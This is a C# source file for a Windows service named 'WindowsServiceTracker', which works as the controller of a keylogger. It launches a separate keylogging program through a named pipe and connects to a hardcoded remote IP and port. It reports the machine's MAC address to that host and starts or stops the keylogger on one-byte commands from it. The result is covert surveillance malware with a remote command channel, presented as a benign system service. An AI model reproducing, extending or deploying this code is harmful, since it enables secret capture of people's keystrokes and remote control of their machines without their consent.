using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets; //used for TcpClient class
using System.Net; //used for IPEndPoint class
using System.Threading;
using System.IO;
using KeyloggerCommunications;
using System.ServiceModel;
using System.Net.NetworkInformation;

namespace WindowsServiceTracker
{
    /***********************************************************************
     * This class is where the majority of the work of the service is done.
     * We may possibly want to split up our different functions into different
     * classes.
     ***********************************************************************/
    public partial class Tracker : ServiceBase, KeyloggerCommInterface
    {
        //Constants
        //127.0.0.1 = 0x0100007F because of network byte order
        private const long IP_ADDRESS = 0x6c3911ac;
        private const int PORT = 10011;
        private const string ERROR_LOG_NAME = "TrackerErrorLog";
        private const string ERROR_LOG_MACHINE = "TrackerComputer";
        private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";

        //Variables
        private IPEndPoint ipPort = new IPEndPoint(IP_ADDRESS, PORT);
        private volatile TcpClient tcp;
        private NetworkStream tcpStream;
        private ChannelFactory<KeyloggerCommInterface> pipeFactory = new ChannelFactory<KeyloggerCommInterface>(
            new NetNamedPipeBinding(), new EndpointAddress("net.pipe://localhost/PipeKeylogger"));
        private KeyloggerCommInterface pipeProxy;
        private Thread tcpThread;
        private volatile bool tcpKeepAlive = true;
        private volatile string macAddress = null;

        public Tracker()
        {
            InitializeComponent();
            //Creates the error log source if it doesn't already exist
            if (!EventLog.SourceExists(ERROR_LOG_SOURCE))
            {
                EventLog.CreateEventSource(ERROR_LOG_SOURCE, ERROR_LOG_NAME);
            }
        }

        /* This method is the first method to be ran when the service starts running. For pretty
         * much all intents and purposes this is simply the main method.
         */
        protected override void OnStart(string[] args)
        {
            //Use the following line to launch an instance of visual studio to debug
            //with. You can also just run the service and then attach the debugger
            //to the process.
            //System.Diagnostics.Debugger.Launch();

            //Keep the service running for 15 seconds
            Thread.Sleep(15000);

            //Sets the current directory to where the WindowsServiceTracker.exe is located rather
            //than some Windows folder that I couldn't seem to locate
            System.IO.Directory.SetCurrentDirectory(System.AppDomain.CurrentDomain.BaseDirectory);

            CreateOpenPipe();
            StartKeylogger(); //todo remove after debugging

            tcpThread = new Thread(this.MaintainServerConnection);
            tcpThread.Start();
        }

        /*This method runs immediately before the service stops and shuts down. So all writing to
        * config/settings files and closing connections should be done here.
         */
        protected override void OnStop()
        {
            StopKeylogger();
            Disconnect();
            tcpKeepAlive = false;
            if (tcpThread != null && tcpThread.IsAlive)
            {
                tcpThread.Join();
            }
        }

        /*Creates the pipe over which keylogger functions can be called. Functions are called
        * using pipeProxy.FunctionName();
         */
        private void CreateOpenPipe()
        {
            pipeProxy = pipeFactory.CreateChannel();
        }

        //Starts the keylogger
        public bool StartKeylogger()
        {
            if (CheckIfRunning())
            {
                return pipeProxy.StartKeylogger();
            }
            return false;
        }

        //Stops the keylogger
        public bool StopKeylogger()
        {
            if (CheckIfRunning())
            {
                return pipeProxy.StopKeylogger();
            }
            return false;
        }

        //Checks to see if the keylogger program is running
        public bool CheckIfRunning()
        {
            try
            {
                return pipeProxy.CheckIfRunning();
            }
            catch (Exception e)
            {
                return false;
            }
        }

        private void WriteEventLogEntry(string eventLogInput)
        {
            //Write to the Windows Event Logs, shows up under Windows Logs --> Application
            EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
        }

        private string getMacAddress()
        {
            string mac = string.Empty;

            bool keepUnlessEthernet = false;
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
                {
                    return nic.GetPhysicalAddress().ToString();
                }
                else if (!keepUnlessEthernet && nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                {
                    mac = nic.GetPhysicalAddress().ToString();
                    keepUnlessEthernet = true;
                }
                else if (mac == string.Empty && nic.OperationalStatus == OperationalStatus.Up)
                {
                    mac = nic.GetPhysicalAddress().ToString();
                }
            }

            return mac;
        }

        //make a thread based on this method to connect to the server and read/write to the tcp connection
        private void MaintainServerConnection()
        {
            macAddress = getMacAddress();
            int waitBetweenReads = 0;
            int maxwaitBetweenReads = 60; 
            int maxWaitToRead = 5;
            int waitToRead = 0;
            int bufferSize = 1;
            byte[] buffer = new byte[bufferSize];
            while (tcpKeepAlive)
            {
                if (tcp == null || !CheckTCPConnected())
                {
                    try 
                    {
                        Connect();
                        waitToRead = 0;
                        getTcpStream();
                        SendStringMsg(macAddress);
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(waitToRead * 1000);
                        if (waitToRead < maxwaitBetweenReads)
                        {
                            waitToRead += 5;
                        }
                    }
                }
                else
                {
                    // todo make sure thCanRead is false in the case that a previous connection was lost, 
                    // and new one created, but the stream was not changed from the old connection
                    if (tcpStream == null || !tcpStream.CanRead)
                    {
                        getTcpStream();
                    }
                    else if (tcpStream.DataAvailable)
                    {
                        waitBetweenReads = 0;
                        try {
                            tcpStream.Read(buffer, 0, bufferSize);
                            switch (buffer[0])
                            {
                                case 0:
                                    StartKeylogger();
                                    break;
                                case 1:
                                    StopKeylogger();
                                    break;
                                default:
                                    break;
                            }
                        }
                        catch (Exception)
                        {}
                    }
                    else
                    {
                        Thread.Sleep(waitBetweenReads * 1000);
                        if (waitBetweenReads < maxWaitToRead)
                        {
                            waitBetweenReads++;
                        }
                    }
                }
            }
        }

        private bool Connect()
        {
            try
            {
                tcp = new TcpClient();
                tcp.Connect(ipPort);
                return true;
            }
            catch (Exception)
            {
                throw new Exception("Error connecting");
            }
            //return false;
        }

        private bool CheckTCPConnected() // todo fix this shit
        {
            if (tcp == null || tcpStream == null)
            {
                return false;
            }

            try
            {
                byte[] tmp = new byte[1];
                tcpStream.Write(tmp, 0, 0);
                return true;
            }
            catch (SocketException e)
            {
                return false;
            }
        }

        private bool Disconnect()
        {
            try
            {
                tcpStream.Close();
            }
            catch (NullReferenceException)
            { }
            return true;
        }

        private bool getTcpStream()
        {
            try
            {
                tcpStream = tcp.GetStream();
            }
            catch (InvalidOperationException)
            {
                return false;
            }
            return true;
        }

        private bool SendStringMsg(string stringMsg)
        {
            if (tcpStream != null && tcpStream.CanWrite)
            {
                byte[] msg = Encoding.UTF8.GetBytes(stringMsg + Environment.NewLine);
                tcpStream.Write(msg, 0, msg.Length);
                return true;
            }
            return false;
        }
    }
}